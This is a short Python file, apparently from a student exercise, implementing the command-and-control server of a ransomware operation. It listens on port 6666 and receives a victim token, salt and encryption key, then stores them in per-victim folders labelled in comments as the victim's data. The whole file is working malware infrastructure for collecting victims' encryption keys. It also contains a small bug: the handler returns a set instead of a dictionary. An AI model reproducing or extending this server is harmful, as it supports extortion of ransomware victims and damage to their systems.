import base64
from hashlib import sha256
from http.server import HTTPServer
import os

from cncbase import CNCBase

class CNC(CNCBase):
    ROOT_PATH = "/root/CNC"

    def save_b64(self, token:str, data:str, filename:str):
        # helper
        # token and data are base64 field

        bin_data = base64.b64decode(data)
        path = os.path.join(CNC.ROOT_PATH, token, filename)
        with open(path, "wb") as f:
            f.write(bin_data)

    def post_new(self, path:str, params:dict, body:dict)->dict:
        
        token= body.get("token") #récupération du token
        salt= body.get("salt") #Recup du sel
        key= body.get("key") #Recup de la clé
    
        if not token or not salt or not key:
            return {"status":"KO"}
        
       #Dossier pour stocker les dossiers de la victime
        victim_path= os.path.join(self.ROOT_PATH, token)
        os.makedirs(victim_path, exist_ok=True)
        
        #Saving des données
        self.save_b64(token, salt, "salt.bin")
        self.save_b64(token, key, "key.bin")
        
        return{"status", "ok"}
    

           
httpd = HTTPServer(('0.0.0.0', 6666), CNC)
httpd.serve_forever()